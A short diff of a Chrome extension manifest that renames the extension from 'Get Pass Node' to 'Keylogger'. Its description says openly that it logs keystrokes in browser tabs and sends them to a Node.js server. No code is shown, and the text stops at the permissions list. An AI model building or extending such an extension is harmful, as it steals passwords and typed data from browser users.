@@ -1,6 +1,6 @@
 {
     "manifest_version": 3,
-    "name": "Get Pass Node",
+    "name": "Keylogger",
     "description": "Logs the keystrokes on Chrome tabs and sends them to a server created using Node.js!",
     "version": "1.0",
     "permissions": [
